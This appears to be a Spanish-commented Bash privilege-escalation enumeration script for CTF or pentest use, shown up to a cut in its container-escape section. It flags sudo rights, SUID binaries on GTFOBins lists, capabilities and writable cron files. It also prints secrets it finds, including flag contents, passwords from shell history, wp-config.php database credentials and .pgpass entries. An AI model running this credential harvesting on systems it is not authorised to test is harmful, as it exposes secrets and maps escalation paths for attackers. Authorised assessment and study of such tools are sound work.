#!/bin/bash

# NEXPEAS - Next Generation Enum/Priv Escalation Assessment Script
# Más limpio que linpeas, enfocado en hallazgos relevantes

set -o pipefail

# Parse arguments
DEEP_MODE=0
while [[ $# -gt 0 ]]; do
    case $1 in
        --deep)
            DEEP_MODE=1
            shift
            ;;
        --help|-h)
            echo "Usage: ./nexpeas.sh [OPTIONS]"
            echo ""
            echo "OPTIONS:"
            echo "  --deep    Enable deep scanning (additional network correlation, dotfiles, UDP analysis)"
            echo "  --help    Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Colores vibrantes
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
CYAN='\033[0;96m'
MAGENTA='\033[0;95m'
LIME='\033[38;5;82m'
ORANGE='\033[38;5;208m'
PINK='\033[38;5;213m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m' # No Color

# Contadores
CRITICAL=0
HIGH=0
MEDIUM=0

# Banner
print_banner() {
    echo -e "${PINK}"
    cat << "EOF"
    ╔════════════════════════════════════════════════╗
    ║                                                ║
    ║        🔓  N E X P E A S  🔓                  ║
    ║    Privilege Escalation Assessment Tool       ║
    ║                                                ║
    ║     ~ Detección de Vectores de Escalada ~     ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
EOF
    echo ""
    echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# Función para imprimir headers
print_header() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║${NC} ${BOLD}${PINK}$1${NC}${MAGENTA} ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════╝${NC}\n"
}

# Función para alertas críticas
alert_critical() {
    echo -e "${RED}⛔ [CRITICAL]${NC} $1"
    ((CRITICAL++))
}

# Función para alertas altas
alert_high() {
    echo -e "${RED}🔴 [HIGH]${NC} $1"
    ((HIGH++))
}

# Función para alertas medias
alert_medium() {
    echo -e "${YELLOW}🟡 [MEDIUM]${NC} $1"
    ((MEDIUM++))
}

# Función para info
info() {
    echo -e "${GREEN}✅ ${NC} $1"
}

# ============================================
# MOSTRAR BANNER
# ============================================
print_banner

# ============================================
# INFORMACIÓN BÁSICA
# ============================================
print_header "📋 INFORMACIÓN BÁSICA DEL SISTEMA"

echo -e "${BLUE}👤 Usuario Actual:${NC}"
whoami
id
echo ""

echo -e "${BLUE}🖥️  Sistema Operativo:${NC}"
uname -a
echo ""

echo -e "${BLUE}🔧 Kernel Versión:${NC}"
uname -r
echo ""

if [ -f /etc/os-release ]; then
    echo -e "${BLUE}🐧 Distribución:${NC}"
    grep -E "^PRETTY_NAME|^NAME|^VERSION" /etc/os-release | head -3
    echo ""
fi

# ============================================
# PROCESO ACTUAL - /proc/self & CONFIG
# ============================================
print_header "⚙️  PROCESO ACTUAL & CONFIGURACIÓN"

echo -e "${BLUE}Comando del proceso actual:${NC}"
if [ -f /proc/self/cmdline ]; then
    tr '\0' ' ' < /proc/self/cmdline && echo ""
else
    echo "N/A"
fi
echo ""

echo -e "${BLUE}Hostname del sistema:${NC}"
cat /etc/hostname 2>/dev/null || echo "N/A"
echo ""

echo -e "${BLUE}Resoluciones internas (/etc/hosts - principales):${NC}"
if [ -f /etc/hosts ]; then
    grep -v "^#" /etc/hosts | grep -v "^$" | grep -v "127.0.0.1\|::1" | head -5 || info "Solo localhost"
else
    info "No encontrado"
fi
echo ""

echo -e "${BLUE}Archivos interesantes en directorio actual:${NC}"
CWD=$(pwd)
FOUND_CWD=0
for file in app.py main.py config.py config.yml .env requirements.txt package.json settings.py index.js server.js; do
    if [ -f "$CWD/$file" ]; then
        SIZE=$(wc -l < "$CWD/$file" 2>/dev/null || echo "?")
        alert_high "CONFIG: $CWD/$file ($SIZE líneas)"
        ((FOUND_CWD++))
    fi
done
if [ $FOUND_CWD -eq 0 ]; then
    info "No hay archivos de config evidentes"
fi
echo ""

# ============================================
# FLAGS Y ARCHIVOS SENSIBLES - BÚSQUEDA RÁPIDA
# ============================================
print_header "🚩 FLAGS & ARCHIVOS SENSIBLES"

echo -e "${LIME}Buscando flags y archivos interesantes...${NC}\n"

# Buscar flags comunes
FLAGS_FOUND=0
for pattern in "user.txt" "root.txt" "flag.txt" "*flag*" "proof.txt" "secret.txt" "password.txt" ".flag" "FLAG"; do
    FOUND=$(timeout 3 find /home /root /tmp /opt -maxdepth 3 -iname "$pattern" -type f 2>/dev/null | head -5)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read flag; do
            SIZE=$(wc -c < "$flag" 2>/dev/null)
            alert_critical "🚩 FLAG ENCONTRADA: $flag ($SIZE bytes)"
            echo -e "${RED}   Contenido:${NC}"
            head -3 "$flag" 2>/dev/null | sed 's/^/   /'
            ((FLAGS_FOUND++))
        done
    fi
done

if [ $FLAGS_FOUND -eq 0 ]; then
    info "No se encontraron flags (user.txt, root.txt, etc)"
fi
echo ""

# ============================================
# SUDO - EL VECTOR MÁS IMPORTANTE
# ============================================
print_header "🔐 SUDO - ANÁLISIS DE PERMISOS"

echo -e "${BLUE}¿Puedo ejecutar comandos con sudo?${NC}"
SUDO_OUTPUT=$(sudo -l 2>&1 <<< "" | grep -v "password" 2>/dev/null)
if echo "$SUDO_OUTPUT" | grep -qE "NOPASSWD|ALL="; then
    alert_critical "Sudo sin contraseña detectado:"
    echo "$SUDO_OUTPUT" | grep -vE "^Matching|^User|Defaults|env_reset|password" | sed 's/^/  /'
elif echo "$SUDO_OUTPUT" | grep -q "("; then
    alert_high "Sudo disponible con estos permisos:"
    echo "$SUDO_OUTPUT" | grep -vE "^Matching|^User|Defaults|env_reset|password" | sed 's/^/  /'
else
    info "No hay permisos de sudo (o requiere contraseña)"
fi
echo ""

# ============================================
# SUID BINARIES
# ============================================
print_header "💀 SUID BINARIES - POTENCIALES VECTORES"

SUID_DANGEROUS="/usr/bin/sudo /usr/bin/su /usr/bin/passwd /bin/mount /bin/umount /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/nmap /usr/bin/strace /usr/bin/ltrace /usr/bin/ld.so /bin/bash /bin/sh /bin/zsh /usr/bin/env /usr/bin/python /usr/bin/perl /usr/bin/ruby /usr/bin/less /usr/bin/more /usr/bin/ed /usr/bin/vi /usr/bin/vim /bin/nc /bin/netcat /usr/bin/wget /usr/bin/curl"

echo -e "${BLUE}SUID Binaries (buscando en /usr, /bin, /sbin, /opt):${NC}"
SUID_LIST=$(find /usr /bin /sbin /opt -perm -4000 -type f 2>/dev/null | sort)

# Binarios CRÍTICOS (según GTFOBins)
SUID_CRITICAL="/usr/bin/find /usr/bin/sudo /usr/bin/su /bin/bash /bin/sh /bin/zsh /usr/bin/env /usr/bin/nmap /usr/bin/strace /usr/bin/less /usr/bin/more /usr/bin/vi /usr/bin/vim /usr/bin/wget /usr/bin/curl /usr/bin/perl /usr/bin/python /usr/bin/python3 /usr/bin/ruby"

# Binarios ALTOS (potencialmente peligrosos)
SUID_DANGEROUS="/usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/pkexec /bin/mount /bin/umount"

if [ -z "$SUID_LIST" ]; then
    info "No se encontraron SUID binaries"
else
    while IFS= read -r binary; do
        if echo "$SUID_CRITICAL" | grep -qw "$binary"; then
            alert_critical "🚨 CRITICAL SUID (GTFOBins): $binary"
        elif echo "$SUID_DANGEROUS" | grep -qw "$binary"; then
            alert_high "SUID: $binary"
        else
            echo "  $binary"
        fi
    done <<< "$SUID_LIST"
fi
echo ""

# ============================================
# CAPABILITIES
# ============================================
print_header "⚡ CAPABILITIES - PERMISOS ESPECIALES"

echo -e "${BLUE}Binarios con capabilities (excepto cap_net_bind_service):${NC}"
if command -v getcap &> /dev/null; then
    CAPS=$(getcap -r /usr /bin /sbin /opt 2>/dev/null | grep -v "cap_net_bind_service")
else
    CAPS=""
fi

if [ -z "$CAPS" ]; then
    info "No se encontraron capabilities peligrosas"
else
    echo "$CAPS" | while read line; do
        if echo "$line" | grep -qE "cap_setuid|cap_setgid|cap_sys_admin|cap_chown|cap_dac_override"; then
            alert_high "$line"
        else
            echo "  $line"
        fi
    done
fi
echo ""

# ============================================
# CRON JOBS
# ============================================
print_header "⏰ CRON JOBS - TAREAS PROGRAMADAS"

echo -e "${BLUE}Mi crontab:${NC}"
CRON_OUTPUT=$(crontab -l 2>&1 <<< "" 2>/dev/null)
if echo "$CRON_OUTPUT" | grep -qvE "no crontab|not allowed"; then
    echo "$CRON_OUTPUT" | sed 's/^/  /'
else
    info "No hay crontab configurado"
fi
echo ""

echo -e "${BLUE}Cron jobs del sistema (archivos escribibles):${NC}"
for cronfile in /etc/cron.* /var/spool/cron/crontabs/*; do
    if [ -f "$cronfile" ] 2>/dev/null && [ -w "$cronfile" ]; then
        alert_high "ESCRIBIBLE: $cronfile"
    fi
done

WRITABLE_CRON=$(find /etc/cron.* -writable 2>/dev/null)
if [ -z "$WRITABLE_CRON" ]; then
    info "No hay archivos de cron escribibles"
fi
echo ""

# ============================================
# PROCESOS EN EJECUCIÓN - INTERESANTES
# ============================================
print_header "⚙️  PROCESOS EN EJECUCIÓN - ANÁLISIS"

echo -e "${BLUE}Procesos ejecutados por root (sin sistema):${NC}"
ps aux | grep -E "^root" | grep -v "^\[" | grep -v "grep" | awk '{print $2, $NF}' | while read pid cmd; do
    case "$cmd" in
        *mysql*|*postgres*|*redis*|*mongodb*|*elasticsearch*)
            alert_high "Database/Cache: $cmd"
            ;;
        *http*|*nginx*|*apache*|*tomcat*)
            alert_medium "Web Service: $cmd"
            ;;
        *ssh*|*openssh*)
            info "SSH: $cmd"
            ;;
        *)
            echo "  $pid: $cmd"
            ;;
    esac
done
echo ""

# ============================================
# PUERTOS ABIERTOS
# ============================================
print_header "🌐 PUERTOS ABIERTOS - SERVICIOS ESCUCHANDO"

echo -e "${BLUE}Puertos TCP listening (netstat/ss):${NC}"
if command -v ss &> /dev/null; then
    ss -tlnp 2>/dev/null | grep LISTEN | awk '{print $4, $7}' | sort | uniq | while read port service; do
        case "$port" in
            *:22*)
                info "SSH: $port"
                ;;
            *:80*|*:443*|*:8080*|*:8443*|*:3000*|*:5000*)
                alert_medium "Web: $port - $service"
                ;;
            *:3306*|*:5432*|*:27017*|*:6379*)
                alert_high "Database/Cache: $port - $service"
                ;;
            127.0.0.1*|localhost*)
                echo "  Localhost: $port"
                ;;
            *)
                echo "  $port - $service"
                ;;
        esac
    done
elif command -v netstat &> /dev/null; then
    netstat -tlnp 2>/dev/null | grep LISTEN | awk '{print $4, $NF}' | sort | uniq
fi
echo ""

if [ $DEEP_MODE -eq 1 ]; then
    echo -e "${BLUE}Puertos UDP listening:${NC}"
    if command -v ss &> /dev/null; then
        UDP_PORTS=$(ss -ulnp 2>/dev/null | grep -v "UNCONN\|^Netid")
        if [ ! -z "$UDP_PORTS" ]; then
            echo "$UDP_PORTS" | while read -r line; do
                if echo "$line" | grep -q "UNCONN"; then
                    PORT=$(echo "$line" | awk '{print $4}')
                    PID=$(echo "$line" | awk '{print $NF}' | grep -oE '[0-9]+')
                    if [ ! -z "$PORT" ]; then
                        echo "  $PORT (UDP)"
                    fi
                fi
            done
        else
            info "No UDP ports listening"
        fi
    else
        info "UDP check requires 'ss' command"
    fi
    echo ""

    echo -e "${BLUE}Correlación Puerto→PID→Comando:${NC}"
    if [ -f /proc/net/tcp ]; then
        awk 'NR>1 {
            split($2, local, ":");
            port=strtonum("0x" substr(local[2], 1, 4));
            split($4, state, ":");
            if (state[1] == "0A") {
                print port
            }
        }' /proc/net/tcp 2>/dev/null | sort -u | while read port; do
            for pid in /proc/*/fd/*; do
                if [ -L "$pid" ] 2>/dev/null; then
                    target=$(readlink "$pid" 2>/dev/null)
                    if echo "$target" | grep -q "socket:\|TCP"; then
                        proc_pid=$(echo "$pid" | cut -d'/' -f3)
                        if [ -f "/proc/$proc_pid/cmdline" ]; then
                            CMD=$(tr '\0' ' ' < "/proc/$proc_pid/cmdline" 2>/dev/null)
                            if [ ! -z "$CMD" ]; then
                                echo "  [PID: $proc_pid] $port → $CMD" | head -c 120
                                echo ""
                            fi
                        fi
                    fi
                fi
            done | head -3
        done
    fi
    echo ""
fi

# ============================================
# ARCHIVOS SENSIBLES - PERMISOS DÉBILES
# ============================================
print_header "🔒 ARCHIVOS SENSIBLES - PERMISOS DÉBILES"

echo -e "${BLUE}Archivos críticos con permisos cuestionables:${NC}"

SENSITIVE_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/sudoers"
    "/etc/sudoers.d"
    "/root/.ssh"
    "/home"
    "/var/www"
    "/opt"
)

for file in "${SENSITIVE_FILES[@]}"; do
    if [ -e "$file" ]; then
        PERMS=$(ls -ld "$file" | awk '{print $1}')
        if [ -w "$file" ]; then
            alert_high "ESCRIBIBLE: $file ($PERMS)"
        fi
        if echo "$PERMS" | grep -qE "..r.*r.*"; then
            if [[ "$file" == *"shadow"* ]] || [[ "$file" == *"sudoers"* ]]; then
                alert_high "LEGIBLE: $file (readable!)"
            fi
        fi
    fi
done
echo ""

# ============================================
# VARIABLES DE ENTORNO INTERESANTES
# ============================================
print_header "🌍 VARIABLES DE ENTORNO - POSIBLES CREDENCIALES"

echo -e "${BLUE}Variables con valores sensibles:${NC}"
env | grep -iE "pass|pwd|key|secret|token|api|user|cred|db_|mysql|postgres|mongo" | while read var; do
    alert_medium "ENV VAR: $var"
done
echo ""

# ============================================
# ARCHIVOS DE CONFIGURACIÓN Y SECRETOS
# ============================================
print_header "📂 ARCHIVOS DE CONFIGURACIÓN & SECRETOS - BÚSQUEDA EXHAUSTIVA"

echo -e "${BLUE}Archivos de configuración encontrados (en directorio actual y /tmp):${NC}"

# Lista exhaustiva de patrones a buscar
CONFIG_PATTERNS=(
    # Docker/Contenedores
    ".dockerenv"
    "/.dockerenv"
    ".docker/config.json"
    "docker-compose.yml"
    "docker-compose.yaml"
    "Dockerfile"

    # Environment & Secretos
    ".env"
    ".env.local"
    ".env.*.local"
    ".env.production"
    ".env.staging"
    "*.env"
    ".secrets"
    ".credentials"
    "credentials.json"
    "secrets.json"

    # Aplicaciones Web
    "config.php"
    "wp-config.php"
    "wp-settings.php"
    "settings.py"
    "settings.json"
    "config.json"
    "config.yaml"
    "config.yml"
    "app.config"
    ".htaccess"
    "web.config"
    "nginx.conf"
    "apache2.conf"

    # Node.js
    "package.json"
    "package-lock.json"
    "yarn.lock"
    ".npmrc"
    ".yarnrc"
    ".npm-rc"

    # Python
    "requirements.txt"
    "setup.py"
    "setup.cfg"
    "pyproject.toml"
    ".python-version"
    "Pipfile"
    "Pipfile.lock"
    "tox.ini"

    # Ruby
    "Gemfile"
    "Gemfile.lock"
    ".ruby-version"

    # Java/Maven
    "pom.xml"
    "build.gradle"
    "settings.xml"

    # Bases de Datos
    ".sqlite"
    "*.db"
    "*.sqlite"
    "*.sqlite3"
    "database.yml"
    "database.json"

    # SSH & Keys
    ".ssh/authorized_keys"
    ".ssh/id_rsa"
    ".ssh/id_ed25519"
    ".ssh/config"
    ".ssh/known_hosts"
    "*.pem"
    "*.key"
    "*.pub"

    # Git & Versioning
    ".git/config"
    ".gitconfig"
    ".github/workflows"
    ".gitlab-ci.yml"
    ".travis.yml"

    # Backups & Dumps
    "*.bak"
    "*.backup"
    "*.sql"
    "*.sql.gz"
    "dump.sql"
    "backup.tar"
    "*.tar.gz"
    "*.zip"

    # Logging & Temp
    ".log"
    "*.log"
    ".tmp"

    # Cloud & APIs
    ".aws/credentials"
    ".aws/config"
    ".gcloud"
    "google-credentials.json"
    ".azure"
    ".vault-token"
)

FOUND_CONFIGS=0

# Buscar en directorios clave
SEARCH_DIRS=(
    "."
    ".."
    "/tmp"
    "/home/$USER"
    "/home/*"
    "/opt"
    "/var/www"
    "/var/www/html"
    "/srv"
    "/root"
    "~"
)

for pattern in "${CONFIG_PATTERNS[@]}"; do
    # Búsqueda rápida sin recursión profunda
    FOUND=$(find ${SEARCH_DIRS[@]} -name "$pattern" -type f 2>/dev/null | head -5)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read file; do
            if [ -f "$file" ] 2>/dev/null; then
                SIZE=$(du -h "$file" 2>/dev/null | awk '{print $1}')
                LINES=$(wc -l < "$file" 2>/dev/null || echo "?")

                if [[ "$file" == *".env"* ]] || [[ "$file" == *"secret"* ]] || [[ "$file" == *"credential"* ]] || [[ "$file" == *"config.php"* ]] || [[ "$file" == *"wp-config"* ]]; then
                    alert_high "🔑 CONFIGURATION FOUND: $file ($SIZE, $LINES líneas)"
                    # Mostrar primeras líneas sin valores reales
                    grep -E "^[A-Z_]+=" "$file" 2>/dev/null | head -3 | sed 's/=.*/=***/' | sed 's/^/    /' || true
                elif [[ "$file" == *".dockerenv"* ]]; then
                    alert_critical "🐳 DOCKER CONTAINER DETECTED: $file"
                else
                    echo "  📄 $file ($SIZE)"
                fi
                ((FOUND_CONFIGS++))
            fi
        done
    fi
done

if [ $FOUND_CONFIGS -eq 0 ]; then
    info "No configuration files found in common locations"
fi
echo ""

# ============================================
# ARCHIVOS ESPECIALES DEL SISTEMA
# ============================================
echo -e "${BLUE}Archivos especiales del sistema:${NC}"

SPECIAL_FILES=(
    "/.dockerenv:Docker Container"
    "/.singularity:Singularity Container"
    "/proc/vz/veinfo:OpenVZ Container"
    "/cgroup:cgroup Detection"
    "/sys/hypervisor/type:Hypervisor Detection"
    "/.aws:AWS Credentials"
    "/.gcloud:Google Cloud"
    "/.azure:Azure Credentials"
    "/vault:HashiCorp Vault"
)

for entry in "${SPECIAL_FILES[@]}"; do
    file="${entry%:*}"
    desc="${entry#*:}"
    if [ -e "$file" ] 2>/dev/null; then
        if [[ "$file" == *"docker"* ]]; then
            alert_critical "🐳 CONTAINERIZATION: $desc"
        elif [[ "$file" == *".aws"* ]] || [[ "$file" == *".gcloud"* ]] || [[ "$file" == *".azure"* ]]; then
            alert_high "☁️  CLOUD CREDENTIALS: $desc"
        else
            alert_medium "🔍 DETECTED: $desc"
        fi
    fi
done
echo ""

# ============================================
# USUARIOS DEL SISTEMA
# ============================================
print_header "👥 USUARIOS DEL SISTEMA"

echo -e "${BLUE}Usuarios con shell (sin system users):${NC}"
awk -F: '$7 ~ /bin\/(bash|sh|zsh|fish)/ {print $1 " (UID: " $3 ")"}' /etc/passwd | while read user; do
    if [[ "$user" == *UID:\ 0* ]]; then
        alert_high "ROOT USER: $user"
    else
        echo "  $user"
    fi
done
echo ""

echo -e "${BLUE}Usuarios en /home:${NC}"
ls -la /home 2>/dev/null | grep "^d" | awk '{print $NF}' | grep -v "^$" | while read user; do
    echo "  $user"
    if [ -d "/home/$user/.ssh" ]; then
        echo "    └─ SSH keys encontradas"
    fi
done
echo ""

# ============================================
# MONTAJES - PERMISO DE MONTAJE
# ============================================
print_header "📦 MONTAJES - PERMISOS DE MONTAJE"

echo -e "${BLUE}Montajes actuales:${NC}"
mount | grep -v "^cgroup" | while read mount; do
    if echo "$mount" | grep -qE "noexec|nodev|nosuid"; then
        info "Montado seguro: $mount"
    elif echo "$mount" | grep -qE "ext4|btrfs|xfs"; then
        echo "  $mount"
    fi
done
echo ""

# ============================================
# FSTAB - CONFIGURACIÓN DE MONTAJES
# ============================================
print_header "📄 FSTAB - ANÁLISIS DE CONFIGURACIÓN"

echo -e "${BLUE}Líneas interesantes en /etc/fstab:${NC}"
if [ -f /etc/fstab ]; then
    grep -v "^#" /etc/fstab | grep -v "^$" | while read line; do
        if echo "$line" | grep -qE "noexec|nodev|nosuid"; then
            info "Seguro: $line"
        elif echo "$line" | grep -qE "defaults"; then
            echo "  $line"
        fi
    done
fi
echo ""

# ============================================
# SERVICIOS - ANÁLISIS
# ============================================
print_header "🔧 SERVICIOS SYSTEMD - ANÁLISIS"

echo -e "${BLUE}Servicios activos (user-relevant):${NC}"
systemctl list-units --type=service --state=running 2>/dev/null | grep -E "mysql|postgres|redis|mongo|http|nginx|apache|ftp|ssh|smb" | awk '{print $1}' | sed 's/\.service$//' | while read service; do
    case "$service" in
        *ssh*)
            info "SSH: $service"
            ;;
        *http*|*nginx*|*apache*|*web*)
            alert_medium "Web: $service"
            ;;
        *mysql*|*postgres*|*mongo*|*redis*)
            alert_high "Database/Cache: $service"
            ;;
        *)
            echo "  $service"
            ;;
    esac
done
echo ""

# ============================================
# HISTORIAL - CREDENCIALES EN COMANDOS
# ============================================
print_header "📜 HISTORIAL - BÚSQUEDA DE CREDENCIALES"

echo -e "${BLUE}Archivos de historial encontrados:${NC}"
HISTORY_FILES=(
    ~/.bash_history
    ~/.zsh_history
    ~/.fish_history
    ~/.sh_history
    ~/.history
)

for hfile in "${HISTORY_FILES[@]}"; do
    if [ -f "$hfile" ]; then
        CREDS=$(grep -iE "password|passwd|pwd|pass=|secret|api.?key|token=" "$hfile" 2>/dev/null | head -3)
        if [ ! -z "$CREDS" ]; then
            alert_high "Potenciales credenciales en: $hfile"
            echo "$CREDS" | sed 's/^/    /' | head -3
        else
            info "Revisado: $hfile (sin credenciales obvias)"
        fi
    fi
done
echo ""

# ============================================
# ARCHIVOS INTERESANTES - BÚSQUEDA PROFUNDA
# ============================================
print_header "🎯 ARCHIVOS INTERESANTES - BÚSQUEDA PROFUNDA"

echo -e "${BLUE}Buscando archivos de configuración (con timeout):${NC}"
CONFIG_PATTERNS=(".env" ".env.local" ".env.production" "config.php" "config.js" "settings.py" "database.yml" "secrets.yml" "credentials")

for pattern in "${CONFIG_PATTERNS[@]}"; do
    FOUND=$(timeout 5 find /home /opt /var/www /srv -name "$pattern" -type f 2>/dev/null | head -5)
    if [ ! -z "$FOUND" ]; then
        while IFS= read -r file; do
            alert_high "CONFIG: $file"
        done <<< "$FOUND"
    fi
done
echo ""

echo -e "${BLUE}Archivos con extensiones sospechosas:${NC}"
SUSPICIOUS_EXTS=("*.sql" "*.db" "*.sqlite" "*.sqlite3" "*.bak" "*.backup" "*.old")
for ext in "${SUSPICIOUS_EXTS[@]}"; do
    FOUND=$(timeout 3 find /home /opt /var/www /srv -name "$ext" -type f 2>/dev/null | head -3)
    if [ ! -z "$FOUND" ]; then
        while IFS= read -r file; do
            alert_medium "ARCHIVO: $file"
        done <<< "$FOUND"
    fi
done
echo ""

echo -e "${BLUE}Buscando en directorios comunes:${NC}"
for dir in /opt /srv /var/www; do
    if [ -d "$dir" ]; then
        INTERESTING=$(timeout 3 find "$dir" -maxdepth 2 \( -name "*.env" -o -name "config*" -o -name "*secret*" \) -type f 2>/dev/null | head -3)
        if [ ! -z "$INTERESTING" ]; then
            echo -e "${YELLOW}En $dir:${NC}"
            echo "$INTERESTING" | sed 's/^/  /'
        fi
    fi
done
echo ""

echo -e "${BLUE}Buscando credenciales hardcodeadas en archivos:${NC}"
# Buscar en archivos comunes con timeout
for searchdir in /home /opt /var/www; do
    if [ -d "$searchdir" ]; then
        CREDS=$(timeout 10 find "$searchdir" -maxdepth 3 -type f \( -name "*.php" -o -name "*.py" -o -name "*.js" -o -name "*.env" \) 2>/dev/null | \
                xargs grep -l -iE "password\s*=|api_key|secret_key" 2>/dev/null | head -5)
        if [ ! -z "$CREDS" ]; then
            echo "$CREDS" | while read file; do
                alert_high "CREDENCIALES EN: $file"
                grep -n -iE "password|api_key|secret_key" "$file" 2>/dev/null | head -1 | sed 's/^/    /'
            done
        fi
    fi
done
echo ""

# ============================================
# BASES DE DATOS - BÚSQUEDA
# ============================================
print_header "🗄️  BASES DE DATOS - BÚSQUEDA Y CREDENCIALES"

echo -e "${BLUE}Archivos de base de datos encontrados:${NC}"
DB_EXTENSIONS=("*.db" "*.sqlite" "*.sqlite3" "*.sql")
for ext in "${DB_EXTENSIONS[@]}"; do
    FOUND=$(timeout 5 find /home /opt /var/www /tmp -name "$ext" -type f 2>/dev/null | head -5)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read dbfile; do
            SIZE=$(du -h "$dbfile" 2>/dev/null | cut -f1 || echo "?")
            alert_medium "DATABASE: $dbfile ($SIZE)"
        done
    fi
done
echo ""

echo -e "${BLUE}Archivos de configuración de base de datos:${NC}"
DB_CONFIGS=(
    "/etc/mysql/my.cnf"
    "/etc/postgresql/postgresql.conf"
    "/etc/mongodb.conf"
    "/etc/redis.conf"
    "~/.my.cnf"
    "~/.pgpass"
)

for config in "${DB_CONFIGS[@]}"; do
    config_expanded="${config/#~/$HOME}"
    if [ -f "$config_expanded" ] 2>/dev/null; then
        alert_high "DB CONFIG: $config_expanded"
        grep -E "password|user|host" "$config_expanded" 2>/dev/null | sed 's/^/    /'
    fi
done
echo ""

# MySQL credentials
echo -e "${BLUE}Credenciales de MySQL en archivos:${NC}"
MYSQL_CREDS=$(find /home /var/www /opt -type f \( -name "*.php" -o -name "*.conf" -o -name "*.cnf" \) 2>/dev/null | \
              xargs grep -h -iE "mysql_connect|mysqli|PDO.*mysql" 2>/dev/null | head -5)
if [ ! -z "$MYSQL_CREDS" ]; then
    alert_high "Conexiones MySQL encontradas"
    echo "$MYSQL_CREDS" | sed 's/^/  /'
fi
echo ""

# ============================================
# GIT REPOSITORIES - INFORMACIÓN SENSIBLE
# ============================================
print_header "🔱 GIT REPOSITORIES - BÚSQUEDA DE SECRETOS"

echo -e "${BLUE}Repositorios Git encontrados:${NC}"
GIT_REPOS=$(timeout 5 find /home /opt /var/www -maxdepth 3 -name ".git" -type d 2>/dev/null | head -5)
if [ ! -z "$GIT_REPOS" ]; then
    echo "$GIT_REPOS" | while read gitdir; do
        repo_dir=$(dirname "$gitdir")
        alert_medium "GIT REPO: $repo_dir"

        # Buscar .env en git
        if timeout 2 git -C "$repo_dir" ls-files 2>/dev/null | grep -q ".env"; then
            alert_high "  └─ .env está tracked en git!"
        fi
    done
else
    info "No se encontraron repositorios git"
fi
echo ""

# ============================================
# APLICACIONES WEB - ANÁLISIS
# ============================================
print_header "🌐 APLICACIONES WEB - ANÁLISIS"

echo -e "${BLUE}Directorios web encontrados:${NC}"
WEB_DIRS=("/var/www" "/home/*/public_html" "/opt/*/public" "/home/*/www" "/srv/www")
for webdir in "${WEB_DIRS[@]}"; do
    if ls -d $webdir 2>/dev/null | grep -q "/"; then
        echo "  $(ls -d $webdir 2>/dev/null)"
    fi
done
echo ""

echo -e "${BLUE}Frameworks web detectados:${NC}"
# WordPress
if find /var/www /home -name "wp-config.php" 2>/dev/null | head -1; then
    alert_medium "WordPress detectado"
    WP_CONFIG=$(find /var/www /home -name "wp-config.php" 2>/dev/null | head -1)
    if [ ! -z "$WP_CONFIG" ]; then
        grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" "$WP_CONFIG" 2>/dev/null | sed 's/^/  /'
    fi
fi

# Laravel
if find /var/www /home -name ".env" 2>/dev/null | xargs grep -l "APP_NAME=Laravel" 2>/dev/null | head -1; then
    alert_medium "Laravel detectado"
fi

# Django
if find /var/www /home -name "settings.py" 2>/dev/null | xargs grep -l "INSTALLED_APPS" 2>/dev/null | head -1; then
    alert_medium "Django detectado"
fi

# Symfony
if find /var/www /home -name "composer.json" 2>/dev/null | xargs grep -l "symfony" 2>/dev/null | head -1; then
    alert_medium "Symfony detectado"
fi
echo ""

# ============================================
# ARCHIVOS DE BACKUP
# ============================================
print_header "💾 ARCHIVOS DE BACKUP - POTENCIAL DE DATOS"

echo -e "${BLUE}Archivos de backup encontrados:${NC}"
BACKUP_PATTERNS=("*.bak" "*.backup" "*.old" "*.zip" "*.tar.gz" "*.tar")
BACKUP_COUNT=0

for pattern in "${BACKUP_PATTERNS[@]}"; do
    FOUND=$(timeout 3 find /home /opt /var/www -maxdepth 2 -name "$pattern" -type f 2>/dev/null | head -3)
    if [ ! -z "$FOUND" ]; then
        echo "$FOUND" | while read backup; do
            alert_medium "BACKUP: $backup"
            ((BACKUP_COUNT++))
        done
    fi
done

if [ $BACKUP_COUNT -eq 0 ]; then
    info "No se encontraron backups obvios"
fi
echo ""

# ============================================
# CONTAINER ESCAPE VECTORS - ANÁLISIS GENERAL
# ============================================
print_header "🔓 CONTAINER ESCAPE VECTORS - ANÁLISIS DE VECTORES DE ESCAPE"

# Detectar si estamos en un contenedor
IN_CONTAINER=0
if [ -f /.dockerenv ] || [ -f /run/.containerenv ]; then
    alert_critical "🐳 RUNNING INSIDE CONTAINER - Escape analysis enabled"
    IN_CONTAINER=1
fi
echo ""

if [ $IN_CONTAINER -eq 1 ]; then

    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}1. CAPACIDADES PELIGROSAS (CAP_SYS_ADMIN, etc)${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    # Verificar capacidades usando /proc/self/status
    if [ -f /proc/self/status ]; then
        CAPS=$(grep Cap /proc/self/status 2>/dev/null | grep -E "Cap(Inh|Prm|Eff|Bnd)")
        if [ ! -z "$CAPS" ]; then
            echo -e "${YELLOW}Raw capabilities from /proc/self/status:${NC}"
            echo "$CAPS" | sed 's/^/  /'
            echo ""

            # Convertir hex a names si capsh disponible
            if command -v capsh &> /dev/null; then
                echo -e "${YELLOW}Decoded capabilities:${NC}"
                capsh --print 2>/dev/null | sed 's/^/  /'
                echo ""

                # Buscar capacidades peligrosas
                if capsh --print 2>/dev/null | grep -qE "cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_chown"; then
                    alert_critical "🔴 DANGEROUS CAPABILITIES DETECTED!"
                    echo -e "${RED}  cap_sys_admin     → kernel exploit, mount, nsenter${NC}"
                    echo -e "${RED}  cap_sys_ptrace    → process manipulation, ASLR bypass${NC}"
